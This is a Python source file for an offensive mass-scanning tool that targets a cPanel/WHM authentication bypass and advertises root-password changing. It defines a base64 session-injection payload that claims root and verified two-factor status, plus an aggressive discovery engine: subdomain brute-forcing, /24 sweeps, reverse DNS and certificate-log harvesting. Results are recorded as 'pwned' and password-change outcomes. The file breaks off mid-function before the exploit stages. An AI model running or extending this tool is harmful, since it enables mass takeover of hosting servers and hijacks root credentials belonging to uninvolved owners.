#!/usr/bin/env python3
# By: Nxploited
# cPanel/WHM Authentication Bypass Mass Scanner + Root Password Changer
# CVE-2026-41940
# For authorized security testing only.
from __future__ import annotations

import argparse
import asyncio
import aiohttp
import socket
import sys
import os
import re
import json
import random
import urllib.parse
import ssl
import ipaddress
from dataclasses import dataclass, field
from datetime import datetime
from typing import Optional, List, Dict, Set, Tuple
from urllib.parse import urlparse

import urllib3
from colorama import Fore, Style, init as color_init

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
color_init(autoreset=True)

# Professional red-first UI (banner, frames, gutters)
_UI_W = 78
Clr = Style.RESET_ALL
C_BLK = Style.BRIGHT + Fore.RED
C_HI = getattr(Fore, "LIGHTRED_EX", Fore.RED) + Style.BRIGHT
C_MUTED = Style.DIM + Fore.RED
C_TX = Fore.WHITE
C_DIMTX = Style.DIM + Fore.WHITE


def _ui_bar(light: bool = False) -> str:
    ch = "═"
    base = C_HI if light else C_BLK
    return base + ch * (_UI_W - 2) + Clr


def _ui_sep() -> str:
    """Thin rule for summaries."""
    return C_MUTED + "─" * _UI_W + Clr


# ══════════════════════════════════════════════════════════
# Output (default: only Nx_Output/Nx_RCE.txt + Nx_Output/Nx_passwd.txt)
# ══════════════════════════════════════════════════════════
OUTPUT_DIR = "Nx_Output"
_MINIMAL_DISK_OUTPUT = True
RANGE_SAMPLE_CAP = 384
_MAX_CT_NAMES = 600
# Set True when --exhaustive (wider PTR sampling, etc.)
_RUN_EXHAUSTIVE = False


def set_range_sample_cap(n: int) -> None:
    global RANGE_SAMPLE_CAP
    RANGE_SAMPLE_CAP = max(32, min(2048, int(n)))


def set_max_ct_names(n: int) -> None:
    global _MAX_CT_NAMES
    _MAX_CT_NAMES = max(50, min(4000, int(n)))


def set_exhaustive_mode(on: bool) -> None:
    global _RUN_EXHAUSTIVE
    _RUN_EXHAUSTIVE = bool(on)

RCE_FILE: str = ""
PASSWD_FILE: str = ""

def apply_output_dir(directory: str) -> None:
    """Point RCE/passwd files under directory (created if missing)."""
    global OUTPUT_DIR, RCE_FILE, PASSWD_FILE
    OUTPUT_DIR = directory
    os.makedirs(OUTPUT_DIR, exist_ok=True)
    RCE_FILE = os.path.join(OUTPUT_DIR, "Nx_RCE.txt")
    PASSWD_FILE = os.path.join(OUTPUT_DIR, "Nx_passwd.txt")


apply_output_dir(OUTPUT_DIR)

# Secondary paths (--full-logs only; otherwise never written)
RESULTS_FILE        = "Nx_pwned.txt"
VULN_FILE           = "Nx_vulnerable.txt"
ERRORS_FILE         = "Nx_errors.txt"
WHM_CONFIRMED_FILE  = "whm_confirmed.txt"
WHM_LIKELY_FILE     = "whm_likely.txt"
CPANEL_CONF_FILE    = "cpanel_confirmed.txt"
NOT_WHM_FILE        = "custom_ports_not_whm.txt"
IP_WHM_FILE         = "resolved_ip_whm.txt"
BAD_INPUT_FILE      = "bad_input.txt"
OPEN_NOSIG_FILE     = "open_no_signature.txt"
FINGERPRINTS_FILE   = "fingerprints.jsonl"
DISCOVERY_FILE      = "discovery_results.txt"
INTELLIGENCE_FILE   = "intelligence_data.jsonl"
CERTIFICATE_FILE    = "ssl_certificates.txt"
PROVIDER_FILE       = "hosting_providers.txt"
STUDY_DIR           = "Nx_Ips"
CACHE_DIR           = ".cache"


def _disk_writes_minimal_only() -> bool:
    return _MINIMAL_DISK_OUTPUT


def _is_primary_result_file(path: str) -> bool:
    try:
        return os.path.normcase(os.path.abspath(path)) in {
            os.path.normcase(os.path.abspath(RCE_FILE)),
            os.path.normcase(os.path.abspath(PASSWD_FILE)),
        }
    except OSError:
        return False


def set_minimal_disk_output(enabled: bool) -> None:
    global _MINIMAL_DISK_OUTPUT
    _MINIMAL_DISK_OUTPUT = enabled
DEFAULT_TARGETS     = "list.txt"
DEFAULT_CONC        = 15
DEFAULT_TIMEOUT     = 25
MAX_CONC            = 100

# Timeout distribution
DNS_TIMEOUT   = 3
TCP_TIMEOUT   = 2
TLS_TIMEOUT   = 3
HTTP_TIMEOUT  = 5
TOTAL_TIMEOUT = 7

PAYLOAD_B64 = (
    "cm9vdDp4DQpzdWNjZXNzZnVsX2ludGVybmFsX2F1dGhfd2l0aF90aW1lc3RhbXA9OTk5"
    "OTk5OTk5OQ0KdXNlcj1yb290DQp0ZmFfdmVyaWZpZWQ9MQ0KaGFzcm9vdD0x"
)

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:115.0) Gecko/20100101 Firefox/115.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15",
]

# Proper protocol mapping per port
PORT_SCHEME_MAP: dict[int, str] = {
    2087: "https", 2086: "http",
    2083: "https", 2082: "http",
    2096: "https", 2095: "http",
    2078: "https", 2077: "http",
    443:  "https", 80:   "http",
}

DIRECT_PORTS = [
    (2087, "https", "WHM-SSL"),
    (2086, "http",  "WHM-PLAIN"),
    (2083, "https", "cPanel-SSL"),
    (2082, "http",  "cPanel-PLAIN"),
    (2096, "https", "Webmail-SSL"),
    (2095, "http",  "Webmail-PLAIN"),
    (2078, "https", "WebDisk-SSL"),
    (2077, "http",  "WebDisk-PLAIN"),
]

WHM_PORTS   = [(2087, "https", "WHM-SSL"), (2086, "http", "WHM-PLAIN")]
P1_PORTS    = WHM_PORTS
P4_PORTS    = DIRECT_PORTS

# Common WHM/cPanel / hosting subdomains — expanded derivation surface (DNS-resolved only)
WHM_SUBDOMAINS = [
    "whm", "cpanel", "webmail", "webdisk", "panel", "control",
    "hosting", "server", "admin", "mail", "secure",
    "cpcalendars", "cpcontacts", "autoconfig", "autodiscover",
    "smtp", "smtps", "pop", "pop3", "imap", "imaps", "mx", "m",
    "ftp", "ftps", "sftp", "ns", "ns1", "ns2", "dns", "dns1", "dns2",
    "www", "ww1", "shop", "store", "blog", "dev", "staging", "stage",
    "test", "beta", "demo", "old", "new", "origin", "direct", "edge",
    "cdn", "static", "assets", "api", "app", "apps", "portal", "my",
    "members", "client", "clients", "customer", "customers", "user",
    "users", "support", "help", "ticket", "billing", "pay", "invoice",
    "reseller", "resellers", "root", "node", "nodes", "vps", "vm",
    "host", "hosts", "box", "srv", "cp", "cpl", "plesk", "plesk01",
    "wholesale", "shared", "dedicated", "managed", "cloud", "private",
]
# cpanel-style numeric hostnames (server1.example.com …) — small range to limit DNS load
_DERIVED_NUMERIC_PREFIXES = ("server", "srv", "ns", "mail", "mx", "cpanel", "whm", "node", "vps", "host")
_DERIVED_NUMERIC_RANGE = range(1, 31)  # 1..30
_DERIVED_COMPOUND_PATTERNS = (
    "api", "dev", "stage", "staging", "test", "prod", "origin", "direct",
    "admin", "panel", "secure", "edge", "cdn", "gateway", "auth", "login",
)
_RECURSIVE_DERIVATION_DEPTH = 3
_RECURSIVE_BASE_DOMAIN_CAP = 260
# Max extra hosts for secondary cert fan-out (SAN expansion from discovered names)
_CERT_FANOUT_CAP_DEFAULT = 56
_CERT_FANOUT_CAP_EXHAUSTIVE = 140

# Common cPanel/WHM ports for scanning
CPANEL_PORTS = [2083, 2082, 2087, 2086, 2096, 2095, 2078, 2077, 443, 80]

SERVICE_SUBDOMAINS = ["whm", "cpanel", "webmail", "webdisk"]

MULTI_TLDS = {
    "co.uk","org.uk","me.uk","net.uk","ltd.uk","plc.uk",
    "com.au","net.au","org.au","edu.au","gov.au",
    "co.nz","net.nz","org.nz","govt.nz",
    "co.za","org.za","net.za","gov.za","edu.za",
    "gov.sa","edu.sa","com.sa","net.sa","org.sa",
    "com.br","net.br","org.br","gov.br",
    "co.in","net.in","org.in","gov.in",
    "com.mx","gob.mx","org.mx",
    "co.jp","ne.jp","or.jp","go.jp","ac.jp",
    "com.hk","org.hk","gov.hk",
    "com.sg","org.sg","gov.sg",
    "com.my","org.my","gov.my",
    "com.eg","org.eg","gov.eg",
}

# Fingerprint scoring system
FP_SCORES = {
    "cpsrvd":                   80,
    "whostmgrsession":          80,
    "/cpsess":                  70,
    "WHM Web Host Manager":     60,
    "cPanel Web Hosting":       55,
    "/login/?login_only=1":     40,
    "cpanel_authtoken":         35,
    "WHM":                      25,
    "cPanel":                   20,
    "cpanel":                   15,
    "webdisk":                  10,
    "webmail":                  10,
}

FP_NEGATIVES = {
    "Kibana":        -30,
    "Elasticsearch": -30,
    "Grafana":       -30,
    "nginx":         -15,
    "Apache":        -10,
}

BANNER = f"""{Clr}
{C_HI}
  ███╗   ██╗██╗  ██╗    ██████╗  ██████╗  ██████╗ ████████╗
  ████╗  ██║╚██╗██╔╝    ██╔══██╗██╔═══██╗██╔═══██╗╚══██╔══╝
  ██╔██╗ ██║ ╚███╔╝     ██████╔╝██║   ██║██║   ██║   ██║
  ██║╚██╗██║ ██╔██╗     ██╔══██╗██║   ██║██║   ██║   ██║
  ██║ ╚████║██╔╝ ██╗    ██║  ██║╚██████╔╝╚██████╔╝   ██║
  ╚═╝  ╚═══╝╚═╝  ╚═╝    ╚═╝  ╚═╝ ╚═════╝  ╚═════╝    ╚═╝
{_ui_bar(True)}
{C_TX}{Style.BRIGHT}  cPanel/WHM authentication bypass · root credential pivot{Clr}
{C_MUTED}  CVE-2026-41940{Clr}{C_BLK} │ {Clr}{C_MUTED}Nxploited{Clr}{C_BLK} │ {Clr}{C_MUTED}authorized engagement scope only{Clr}
{C_HI}  minimal disk · stratified /24 · CT/PTR corroboration · proof pipeline
{C_BLK}  authorized security testing exclusively — misuse is prohibited
{_ui_bar()}
{Clr}
"""

# ══════════════════════════════════════════════════════════
# Enhanced dataclasses
# ══════════════════════════════════════════════════════════
@dataclass
class Target:
    scheme:   str
    host:     str
    port:     Optional[int]
    path:     str = ""
    source:   str = "input"
    
    @property
    def key(self) -> str:
        port_str = f":{self.port}" if self.port else ""
        return f"{self.scheme}://{self.host.lower()}{port_str}"
    
    @property
    def url_base(self) -> str:
        port_str = f":{self.port}" if self.port else ""
        return f"{self.scheme}://{self.host}{port_str}"

@dataclass
class Endpoint:
    scheme:   str
    host:     str
    port:     int
    label:    str
    priority: int    = 99
    source:   str    = "unknown"

    @property
    def key(self) -> str:
        return f"{self.scheme}://{self.host.lower()}:{self.port}"

    @property
    def url_base(self) -> str:
        return f"{self.scheme}://{self.host}:{self.port}"

@dataclass
class FingerprintResult:
    endpoint:   Endpoint
    score:      int       = 0
    confidence: str       = "not_whm"
    service:    str       = "unknown"
    evidence:   list[str] = field(default_factory=list)
    status_code:int       = 0
    error:      str       = ""

    def classify(self) -> None:
        if self.score >= 80:
            self.confidence = "confirmed"
            self.service    = "WHM" if any("WHM" in e or "whostmgr" in e
                                           for e in self.evidence) else "cPanel"
        elif self.score >= 50:
            self.confidence = "likely"
            self.service    = "cPanel"
        elif self.score >= 25:
            self.confidence = "weak_hint"
            self.service    = "panel_hint"
        else:
            self.confidence = "not_whm"
            self.service    = "other"

@dataclass
class DiscoveryResult:
    original_target: Target
    discovered_targets: List[Target]
    resolved_ips: List[str]
    ssl_domains: List[str] = field(default_factory=list)
    hosting_provider: Optional[str] = None
    ip_ranges_scanned: List[str] = field(default_factory=list)

@dataclass
class IntelligenceData:
    target: Target
    certificate_info: Dict = field(default_factory=dict)
    reverse_dns: Optional[str] = None
    hosting_provider: Optional[str] = None
    related_domains: List[str] = field(default_factory=list)
    ip_range: Optional[str] = None

class Status:
    PWNED_FULL      = "pwned_full"
    PWNED           = "pwned"
    STAGE2_NO_TOKEN = "stage2_no_token"
    STAGE3_FAIL     = "stage3_fail"
    STAGE4_NO_ROOT  = "stage4_no_root"
    NOT_CPANEL      = "not_cpanel"
    NO_SESSION      = "no_session"
    DNS_FAIL        = "dns_fail"
    CONNECT_FAIL    = "connect_fail"
    PASSWD_CHANGED  = "passwd_changed"
    PASSWD_FAIL     = "passwd_fail"
    ERROR           = "error"
    INVALID         = "invalid"
    DISCOVERY_ONLY  = "discovery_only"

# ══════════════════════════════════════════════════════════
# Logging functions
# ══════════════════════════════════════════════════════════
def now_hms() -> str: return datetime.now().strftime("%H:%M:%S")
def now_ts()  -> str: return datetime.now().strftime("%Y-%m-%d %H:%M:%S")
def rand_ua() -> str: return random.choice(USER_AGENTS)

def _ts_red() -> str:
    return f"{C_MUTED}[{now_hms()}]{Clr}"

def tag(level: str, color: str) -> str:
    return f"{C_BLK}[{Clr}{color}{Style.BRIGHT}{level}{Clr}{C_BLK}]{Clr}"

C_TAG_ACCENT = getattr(Fore, "LIGHTRED_EX", Fore.RED)

def log_ok(m):        print(f"{_ts_red()} {tag('OK', Fore.GREEN)}    {Fore.GREEN}{m}{Clr}")
def log_full(m):      print(f"{_ts_red()} {tag('FULL', Fore.RED)}  {Fore.RED}{Style.BRIGHT}{m}{Clr}")
def log_info(m):      print(f"{_ts_red()} {tag('INF', C_TAG_ACCENT)}    {C_TX}{m}{Clr}")
def log_step(m):      print(f"{_ts_red()} {tag('STEP', C_TAG_ACCENT)}  {C_HI}{m}{Clr}")
def log_data(m):      print(f"{_ts_red()} {tag('DATA', Fore.YELLOW)}  {Fore.YELLOW}{m}{Clr}")
def log_warn(m):      print(f"{_ts_red()} {tag('WARN', Fore.YELLOW)}  {Fore.YELLOW}{m}{Clr}")
def log_fail(m):      print(f"{_ts_red()} {tag('FAIL', Fore.RED)}    {Fore.RED}{m}{Clr}")
def log_pass(m):      print(f"{_ts_red()} {tag('PASS', C_TAG_ACCENT)}  {C_HI}{m}{Clr}")
def log_discovery(m): print(f"{_ts_red()} {tag('DISC', C_TAG_ACCENT)}  {C_DIMTX}{m}{Clr}")

_write_lock = asyncio.Lock()

async def write_line_async(path: str, line: str) -> None:
    if _disk_writes_minimal_only() and not _is_primary_result_file(path):
        return
    async with _write_lock:
        try:
            with open(path, "a", encoding="utf-8") as f:
                f.write(line + "\n"); f.flush()
                try: os.fsync(f.fileno())
                except OSError: pass
        except Exception as e:
            log_fail(f"[WRITE] {path}: {e}")

async def write_study_file(host: str, filename: str, content: str) -> str:
    if _disk_writes_minimal_only():
        return ""
    safe_host = re.sub(r"[^\w\.\-]", "_", host)
    path      = os.path.join(STUDY_DIR, f"{safe_host}_{filename}")
    async with _write_lock:
        try:
            os.makedirs(STUDY_DIR, exist_ok=True)
            with open(path, "w", encoding="utf-8") as f:
                f.write(content)
        except Exception as e:
            log_fail(f"[Nx_Ips] {path}: {e}")
    return path

# ══════════════════════════════════════════════════════════
# Caching system
# ══════════════════════════════════════════════════════════
_dns_cache:         dict[str, list[str]] = {}
_tcp_cache:         dict[str, bool]      = {}
_fingerprint_cache: dict[str, FingerprintResult] = {}
_certificate_cache: dict[str, dict] = {}
_dns_lock    = asyncio.Lock()
_tcp_lock    = asyncio.Lock()
_fp_lock     = asyncio.Lock()
_cert_lock   = asyncio.Lock()

def _cache_path(name: str) -> str:
    os.makedirs(CACHE_DIR, exist_ok=True)
    return os.path.join(CACHE_DIR, name)

def _load_json_cache(name: str) -> dict:
    p = _cache_path(name)
    if os.path.exists(p):
        try:
            with open(p, encoding="utf-8") as f:
                return json.load(f)
        except Exception:
            pass
    return {}

def _save_json_cache(name: str, data: dict) -> None:
    try:
        with open(_cache_path(name), "w", encoding="utf-8") as f:
            json.dump(data, f, ensure_ascii=False, indent=2)
    except Exception:
        pass

# ══════════════════════════════════════════════════════════
# Network Intelligence Class
# ══════════════════════════════════════════════════════════
class NetworkIntelligence:
    def __init__(self):
        self.hosting_providers = {}
    
    def _is_ip_str(self, s: str) -> bool:
        s = s.strip("[]")
        try:
            socket.inet_pton(socket.AF_INET, s)
            return True
        except OSError:
            pass
        try:
            socket.inet_pton(socket.AF_INET6, s)
            return True
        except OSError:
            pass
        return False
    
    async def resolve_all_ips(self, hostname: str) -> List[str]:
        """Resolve all A and AAAA records for a hostname"""
        clean = hostname.strip("[]")
        if self._is_ip_str(clean):
            return [clean]

        async with _dns_lock:
            if clean in _dns_cache:
                return _dns_cache[clean]

        loop = asyncio.get_event_loop()
        ips: List[str] = []
        try:
            recs = await asyncio.wait_for(
                loop.run_in_executor(None, socket.getaddrinfo, clean, None),
                timeout=DNS_TIMEOUT
            )
            seen_ips: Set[str] = set()
            for r in recs:
                ip = r[4][0]
                if self._is_ip_str(ip) and ip not in seen_ips:
                    seen_ips.add(ip)
                    ips.append(ip)
        except Exception:
            pass

        async with _dns_lock:
            _dns_cache[clean] = ips

        return ips
    
    async def get_ssl_certificate(self, hostname: str, port: int = 443) -> Optional[Dict]:
        """Extract SSL certificate information including SANs"""
        cache_key = f"{hostname}:{port}"
        
        async with _cert_lock:
            if cache_key in _certificate_cache:
                return _certificate_cache[cache_key]
        
        cert_info = {}
        try:
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            
            conn = await asyncio.wait_for(
                asyncio.open_connection(hostname, port, ssl=context),
                timeout=TLS_TIMEOUT
            )
            reader, writer = conn
            
            cert = writer.get_extra_info('peercert')
            if cert:
                cert_info = {
                    'subject': dict(x[0] for x in cert.get('subject', [])),
                    'issuer': dict(x[0] for x in cert.get('issuer', [])),
                    'version': cert.get('version'),
                    'serial_number': cert.get('serialNumber'),
                    'not_before': cert.get('notBefore'),
                    'not_after': cert.get('notAfter'),
                    'san_domains': []
                }
                
                # Extract Subject Alternative Names
                for ext in cert.get('subjectAltName', []):
                    if ext[0] == 'DNS':
                        cert_info['san_domains'].append(ext[1])
                
            writer.close()
            await writer.wait_closed()
            
        except Exception as e:
            log_warn(f"SSL cert extraction failed for {hostname}:{port}: {e}")
        
        async with _cert_lock:
            _certificate_cache[cache_key] = cert_info
        
        return cert_info if cert_info else None

    async def get_ssl_certificate_any_port(self, hostname: str, ports: List[int]) -> Tuple[Optional[Dict], Optional[int]]:
        """Try several ports (e.g. 443, 2087, 2083) until a certificate is retrieved."""
        for p in ports:
            info = await self.get_ssl_certificate(hostname, p)
            if info and (info.get("san_domains") or info.get("subject")):
                return info, p
        return None, None

    async def detect_hosting_provider(self, target: Target) -> Optional[str]:
        """Detect hosting provider using reverse DNS and SSL issuer"""
        try:
            # Try reverse DNS lookup
            ips = await self.resolve_all_ips(target.host)
            if ips:
                ip = ips[0]
                try:
                    reverse_result = await asyncio.wait_for(
                        asyncio.get_event_loop().run_in_executor(
                            None, socket.gethostbyaddr, ip
                        ), timeout=DNS_TIMEOUT
                    )
                    reverse_hostname = reverse_result[0].lower()
                    
                    # Common hosting provider patterns
                    providers = {
                        'cloudflare': ['cloudflare.com'],
                        'amazon': ['amazonaws.com', 'awsdns'],
                        'google': ['googlecloud.com', 'google.com'],
                        'digitalocean': ['digitalocean.com'],
                        'linode': ['linode.com', 'members.linode.com'],
                        'vultr': ['vultr.com'],
                        'ovh': ['ovh.net', 'ovh.com'],
                        'hetzner': ['hetzner.com'],
                        'godaddy': ['godaddy.com'],
                        'namecheap': ['namecheap.com'],
                        'hostgator': ['hostgator.com'],
                        'bluehost': ['bluehost.com'],
                        'siteground': ['siteground.com']
                    }
                    
                    for provider, patterns in providers.items():
                        if any(pattern in reverse_hostname for pattern in patterns):
                            return provider
                            
                except Exception:
                    pass
            
            # Try SSL certificate issuer
            if hasattr(target, 'port') and target.port in [443, 2087, 2083]:
                cert_info = await self.get_ssl_certificate(target.host, target.port or 443)
                if cert_info and 'issuer' in cert_info:
                    issuer = str(cert_info['issuer']).lower()
                    if 'cloudflare' in issuer:
                        return 'cloudflare'
                    elif 'let\'s encrypt' in issuer:
                        return 'letsencrypt'
                    elif 'godaddy' in issuer:
                        return 'godaddy'
            
        except Exception as e:
            log_warn(f"Provider detection failed for {target.host}: {e}")
        
        return None
    
    def generate_ip_range(self, ip: str) -> List[str]:
        """Generate a /24 IP range for scanning"""
        try:
            network = ipaddress.IPv4Network(f"{ip}/24", strict=False)
            return [str(host) for host in network.hosts()]
        except Exception:
            return []

    async def reverse_ptr(self, ipv4: str) -> Optional[str]:
        """Reverse DNS → hostname (IPv4 only; IPv6 PTR skipped here)."""
        clean = ipv4.strip("[]")
        if not clean or ":" in clean:
            return None
        loop = asyncio.get_event_loop()
        try:
            res = await asyncio.wait_for(
                loop.run_in_executor(None, socket.gethostbyaddr, clean),
                timeout=DNS_TIMEOUT,
            )
            return str(res[0]).rstrip(".").lower() if res and res[0] else None
        except Exception:
            return None

    async def ptr_forward_consistent(self, hostname: str, expect_ip: str) -> bool:
        got = await self.resolve_all_ips(hostname)
        exp = expect_ip.strip("[]")
        return exp in got

# ══════════════════════════════════════════════════════════
# WHM Discovery Engine
# ══════════════════════════════════════════════════════════
class WHMDiscoveryEngine:
    def __init__(self, network_intel: NetworkIntelligence):
        self.network_intel = network_intel
    
    def extract_base_domain(self, host: str) -> str:
        """Extract base domain handling multi-part TLDs"""
        if self.network_intel._is_ip_str(host):
            return host
        parts = host.lower().strip("[]").split(".")
        if len(parts) < 2:
            return host
        if len(parts) >= 3:
            two = f"{parts[-2]}.{parts[-1]}"
            if two in MULTI_TLDS:
                if len(parts) >= 4:
                    return f"{parts[-3]}.{two}"
        return f"{parts[-2]}.{parts[-1]}"
    
    async def discover_subdomains(self, base_domain: str) -> List[Target]:
        """Generate + DNS-resolve common WHM/cPanel-derived hostnames (wordlist + numeric)."""
        discovered_targets: List[Target] = []

        for subdomain in WHM_SUBDOMAINS:
            hostname = f"{subdomain}.{base_domain}"
            ips = await self.network_intel.resolve_all_ips(hostname)
            if ips:
                log_discovery(f"Resolved subdomain: {hostname} -> {ips}")
                discovered_targets.extend(
                    targets_all_services_for_host(hostname, "subdomain_discovery")
                )

        for pref in _DERIVED_NUMERIC_PREFIXES:
            for i in _DERIVED_NUMERIC_RANGE:
                hostname = f"{pref}{i}.{base_domain}"
                ips = await self.network_intel.resolve_all_ips(hostname)
                if ips:
                    log_discovery(f"Resolved numeric host: {hostname} -> {ips}")
                    discovered_targets.extend(
                        targets_all_services_for_host(hostname, "subdomain_numeric")
                    )

        for a in _DERIVED_COMPOUND_PATTERNS:
            hostname = f"{a}.{base_domain}"
            ips = await self.network_intel.resolve_all_ips(hostname)
            if ips:
                discovered_targets.extend(
                    targets_all_services_for_host(hostname, "subdomain_compound")
                )
            for b in ("whm", "cpanel", "mail", "webmail", "api", "panel"):
                hostname2 = f"{a}-{b}.{base_domain}"
                ips2 = await self.network_intel.resolve_all_ips(hostname2)
                if ips2:
                    discovered_targets.extend(
                        targets_all_services_for_host(hostname2, "subdomain_compound")
                    )

        return discovered_targets

    def _collect_recursive_base_domains(
        self,
        initial_host: str,
        discovered_targets: List[Target],
    ) -> List[str]:
        seeds: List[str] = []
        seen: Set[str] = set()

        def _add_domain(hostname: str) -> None:
            if not hostname or self.network_intel._is_ip_str(hostname):
                return
            bd = self.extract_base_domain(hostname)
            if not bd or "." not in bd or bd in seen:
                return
            seen.add(bd)
            seeds.append(bd)

        _add_domain(initial_host)
        for t in discovered_targets:
            _add_domain((t.host or "").strip().lower())
            if len(seeds) >= (_RECURSIVE_BASE_DOMAIN_CAP if _RUN_EXHAUSTIVE else 140):
                break
        return seeds

    async def discover_recursive_derivations(
        self,
        initial_host: str,
        discovered_targets: List[Target],
    ) -> List[Target]:
        all_new: List[Target] = []
        current_domains = self._collect_recursive_base_domains(initial_host, discovered_targets)
        if not current_domains:
            return all_new

        depth = _RECURSIVE_DERIVATION_DEPTH + (1 if _RUN_EXHAUSTIVE else 0)
        visited_domains: Set[str] = set(current_domains)

        for wave in range(1, depth + 1):
            wave_new: List[Target] = []
            domain_cap = _RECURSIVE_BASE_DOMAIN_CAP if _RUN_EXHAUSTIVE else 120
            for bd in current_domains[:domain_cap]:
                try:
                    wave_new.extend(await self.discover_subdomains(bd))
                except Exception as e:
                    log_warn(f"Recursive wave-{wave} failed for {bd}: {e}")

            if not wave_new:
                break

            all_new.extend(wave_new)
            next_domains: List[str] = []
            for t in wave_new:
                h = (t.host or "").strip().lower()
                if not h or self.network_intel._is_ip_str(h):
                    continue
                bd = self.extract_base_domain(h)
                if not bd or "." not in bd or bd in visited_domains:
                    continue
                visited_domains.add(bd)
                next_domains.append(bd)

            current_domains = next_domains
            log_discovery(f"Recursive derivation wave {wave}: +{len(wave_new)} endpoints")
            if not current_domains:
                break

        return all_new
    
    async def discover_from_certificate(self, target: Target) -> List[Target]:
        """Extract new targets from SSL certificate SANs (all names, skip wildcards)."""
        discovered_targets: List[Target] = []
        if self.network_intel._is_ip_str(target.host):
            return discovered_targets

        try_order = []
        if target.port:
            try_order.append(target.port)
        for p in (443, 2087, 2083, 2086):
            if p not in try_order:
                try_order.append(p)

        cert_info, used_port = await self.network_intel.get_ssl_certificate_any_port(
            target.host, try_order
        )
        if not cert_info:
            return discovered_targets

        sans = cert_info.get("san_domains") or []
        log_discovery(f"Certificate on {target.host}:{used_port or '?'} — SAN count: {len(sans)}")
        seen_cn: Set[str] = set()
        for domain in sans:
            d = _normalize_cert_hostname(str(domain))
            if not d:
                continue
            discovered_targets.extend(
                targets_all_services_for_host(d, "certificate_san")
            )
        subj = cert_info.get("subject") or {}
        cn = subj.get("commonName") or subj.get("CN")
        if isinstance(cn, str) and cn:
            hn = _normalize_cert_hostname(cn)
            if hn and hn not in seen_cn:
                seen_cn.add(hn)
                discovered_targets.extend(
                    targets_all_services_for_host(hn, "certificate_cn")
                )
        return discovered_targets
    
    def _stratified_ip_sample(self, hosts: List[str]) -> List[str]:
        """Spread + random fill up to RANGE_SAMPLE_CAP hosts from a /24 list."""
        n = len(hosts)
        if n == 0:
            return []
        cap = min(RANGE_SAMPLE_CAP, n)
        idx: Set[int] = set()
        step = max(1, n // cap)
        for i in range(0, n, step):
            idx.add(i)
        safety = 0
        while len(idx) < cap and safety < cap * 4:
            idx.add(random.randint(0, n - 1))
            safety += 1
        out = [hosts[i] for i in sorted(idx)[:cap]]
        return out

    async def discover_ip_range(self, target: Target) -> List[Target]:
        """/24 expansion with larger stratified sample + core panel ports."""
        discovered_targets: List[Target] = []
        ips = await self.network_intel.resolve_all_ips(target.host)

        for ip in ips:
            try:
                if not self.network_intel._is_ip_str(ip) or ":" in ip.strip("[]"):
                    continue
                ip_range = self.network_intel.generate_ip_range(ip)
                log_discovery(f"/24 from {ip}: {len(ip_range)} hosts, sampling up to {RANGE_SAMPLE_CAP}")
                sampled_ips = self._stratified_ip_sample(ip_range)
                for range_ip in sampled_ips:
                    if range_ip == ip:
                        continue
                    discovered_targets.extend(
                        targets_all_services_for_host(range_ip, "ip_range_scan")
                    )
            except Exception as e:
                log_warn(f"IP range discovery failed for {ip}: {e}")

        return discovered_targets

    async def discover_ptr_hostnames(self, ips: List[str]) -> List[Target]:
        """PTR → hostname; keep only names that forward-resolve back to the IP."""
        out: List[Target] = []
        seen: Set[str] = set()
        ptr_cap = 180 if _RUN_EXHAUSTIVE else 72
        for ip in ips[:ptr_cap]:
            if ":" in ip.strip("[]"):
                continue
            ptr = await self.network_intel.reverse_ptr(ip)
            if not ptr or ptr in seen:
                continue
            if not await self.network_intel.ptr_forward_consistent(ptr, ip):
                continue
            seen.add(ptr)
            log_discovery(f"PTR {ip} -> {ptr} (forward OK)")
            out.extend(targets_all_services_for_host(ptr, "ptr_forward"))
        return out

    @staticmethod
    def _crt_sh_parse_names(rows: object, base_domain: str) -> List[str]:
        names: List[str] = []
        bd = base_domain.lower()
        for row in rows if isinstance(rows, list) else []:
            nv = row.get("name_value") if isinstance(row, dict) else None
            if not nv:
                continue
            for part in re.split(r"[\s,\n\r]+", str(nv).lower()):
                p = _normalize_cert_hostname(part)
                if not p:
                    continue
                if p == bd or p.endswith("." + bd):
                    names.append(p)
        return names

    async def discover_ct_logs(self, base_domain: str) -> List[Target]:
        """Certificate Transparency via crt.sh: wildcard subdomain + apex identity queries."""
        out: List[Target] = []
        if self.network_intel._is_ip_str(base_domain) or "." not in base_domain:
            return []
        urls = (
            f"https://crt.sh/?q={urllib.parse.quote('%.' + base_domain)}&output=json",
            f"https://crt.sh/?q={urllib.parse.quote(base_domain)}&output=json",
        )
        aggregated: List[str] = []
        try:
            to = aiohttp.ClientTimeout(total=55 if _RUN_EXHAUSTIVE else 42)
            async with aiohttp.ClientSession(timeout=to) as session:
                for url in urls:
                    try:
                        async with session.get(url, ssl=False) as resp:
                            if resp.status != 200:
                                continue
                            body = await resp.text(errors="replace")
                        try:
                            rows = json.loads(body)
                        except Exception:
                            continue
                        aggregated.extend(self._crt_sh_parse_names(rows, base_domain))
                    except Exception as e:
                        log_warn(f"crt.sh shard failed ({base_domain}): {e}")
            uniq = list(dict.fromkeys(aggregated))[:_MAX_CT_NAMES]
            log_discovery(f"crt.sh merged {len(uniq)} unique hostnames for {base_domain}")
            for hn in uniq:
                out.extend(targets_all_services_for_host(hn, "ct_log"))
        except Exception as e:
            log_warn(f"crt.sh lookup failed ({base_domain}): {e}")
        return out

    async def discover_certificate_fanout(self, seed_hosts: List[str]) -> List[Target]:
        """
        Second-pass TLS harvest: pull certs from already-discovered names to collect
        additional SANs (one wave, capped — keeps DNS/TLS load bounded).
        """
        cap = _CERT_FANOUT_CAP_EXHAUSTIVE if _RUN_EXHAUSTIVE else _CERT_FANOUT_CAP_DEFAULT
        uniq: List[str] = []
        seen: Set[str] = set()
        for raw in seed_hosts:
            h = (raw or "").strip().lower()
            if not h or self.network_intel._is_ip_str(h):
                continue
            if h not in seen:
                seen.add(h)
                uniq.append(h)
            if len(uniq) >= cap:
                break

        sem = asyncio.Semaphore(14 if _RUN_EXHAUSTIVE else 8)
        ports_try = [443, 2087, 2083, 2086, 2082, 2096]

        async def pull_one(host: str) -> List[Target]:
            async with sem:
                acc: List[Target] = []
                try:
                    info, _ = await self.network_intel.get_ssl_certificate_any_port(
                        host, ports_try
                    )
                    if not info:
                        return acc
